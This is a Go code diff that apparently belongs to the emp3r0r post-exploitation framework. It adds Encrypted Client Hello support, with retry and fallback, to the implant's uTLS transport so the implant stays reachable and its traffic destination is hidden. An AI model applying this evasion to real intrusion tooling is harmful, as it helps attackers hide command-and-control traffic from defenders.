@@ -38,6 +38,7 @@ package transport
 import (
 	"context"
 	"crypto/tls"
+	"errors"
 	"fmt"
 	"net"
 	"net/http"
@@ -49,6 +50,8 @@ import (
 	utls "github.com/refraction-networking/utls"
 	"golang.org/x/net/http2"
 	"golang.org/x/net/proxy"
+
+	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 )
 
 // We use this RoundTripper to make all our requests when neither --helper nor
@@ -101,6 +104,40 @@ func dialUTLS(network, addr string, cfg *utls.Config, clientHelloID *utls.Client
 		return nil, err
 	}
 	return uconn, nil
+}
+
+// dialUTLSWithECH wraps dialUTLS with ECH. When ECH is configured it attaches
+// the fetched ECHConfigList; if the server rejects ECH and offers a retry
+// config, it retries once with that. A fetch failure logs and connects without
+// ECH so the implant stays reachable.
+func dialUTLSWithECH(network, addr string, cfg *utls.Config, clientHelloID *utls.ClientHelloID, forward proxy.Dialer) (*utls.UConn, error) {
+	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
+	defer cancel()
+	list, echConfigured, err := echConfigList(ctx)
+	if err != nil {
+		logging.Warningf("ECH is configured but its config could not be fetched; connecting without ECH: %v", err)
+		echConfigured = false
+	}
+	if !echConfigured || cfg == nil {
+		return dialUTLS(network, addr, cfg, clientHelloID, forward)
+	}
+
+	echCfg := cfg.Clone()
+	echCfg.EncryptedClientHelloConfigList = list
+	conn, err := dialUTLS(network, addr, echCfg, clientHelloID, forward)
+	if err == nil {
+		return conn, nil
+	}
+
+	var echErr *utls.ECHRejectionError
+	if errors.As(err, &echErr) && len(echErr.RetryConfigList) > 0 {
+		logging.Warningf("ECH was rejected; retrying with the server-provided ECH config")
+		recordECHRetry(echErr.RetryConfigList)
+		retryCfg := cfg.Clone()
+		retryCfg.EncryptedClientHelloConfigList = echErr.RetryConfigList
+		return dialUTLS(network, addr, retryCfg, clientHelloID, forward)
+	}
+	return nil, err
 }
 
 // A http.RoundTripper that uses uTLS (with a specified Client Hello ID) to make
@@ -205,7 +242,7 @@ func makeTransport(url *url.URL, clientHelloID *utls.ClientHelloID, cfg *utls.Co
 	// initiate a TLS handshake using the given ClientHelloID. Return the
 	// resulting connection.
 	dial := func(network, addr string) (*utls.UConn, error) {
-		return dialUTLS(network, addr, cfg, clientHelloID, proxyDialer)
+		return dialUTLSWithECH(network, addr, cfg, clientHelloID, proxyDialer)
 	}
 
 	bootstrapConn, err := dial("tcp", addr)
